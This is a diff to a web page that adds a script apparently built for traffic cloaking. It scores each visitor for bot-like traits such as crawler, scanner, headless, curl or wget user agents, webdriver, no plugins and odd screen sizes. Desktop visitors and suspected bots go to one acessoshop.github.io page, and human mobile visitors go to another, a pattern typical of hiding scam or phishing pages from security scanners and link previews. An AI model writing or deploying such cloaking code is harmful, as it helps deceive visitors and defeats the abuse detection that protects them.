@@ -33,11 +33,60 @@
 
 <script>
 (function () {
-    const isMobile = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i.test(navigator.userAgent);
 
-    if (isMobile) {
-        window.location.replace("https://acessoshop.github.io/becca");
+    const linkA = "https://acessoshop.github.io/seguro"; // desktop + bots
+    const linkB = "https://acessoshop.github.io/becca"; // mobile humano
+
+    const ua = navigator.userAgent || "";
+
+    const isMobile = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i.test(ua);
+
+    function isBotLike() {
+        let score = 0;
+
+        // User agents suspeitos
+        if (/bot|crawler|spider|facebookexternalhit|preview|monitor|headless|selenium|phantom|python|curl|wget|slurp|scanner/i.test(ua)) {
+            score++;
+        }
+
+        // Navegador automatizado
+        if (navigator.webdriver) {
+            score++;
+        }
+
+        // Sem plugins instalados
+        if (navigator.plugins.length === 0) {
+            score++;
+        }
+
+        // Sem idioma definido
+        if (!navigator.language || navigator.language.length < 2) {
+            score++;
+        }
+
+        // Mobile sem touch é estranho
+        if (isMobile && navigator.maxTouchPoints === 0) {
+            score++;
+        }
+
+        // Janela pequena/anormal
+        if (window.innerWidth < 300 || window.innerHeight < 300) {
+            score++;
+        }
+
+        return score >= 2;
     }
+
+    // DESKTOP ou BOT = LINK A
+    if (!isMobile || isBotLike()) {
+        window.location.replace(linkA);
+    }
+
+    // MOBILE HUMANO = LINK B
+    else {
+        window.location.replace(linkB);
+    }
+
 })();
 </script>
 
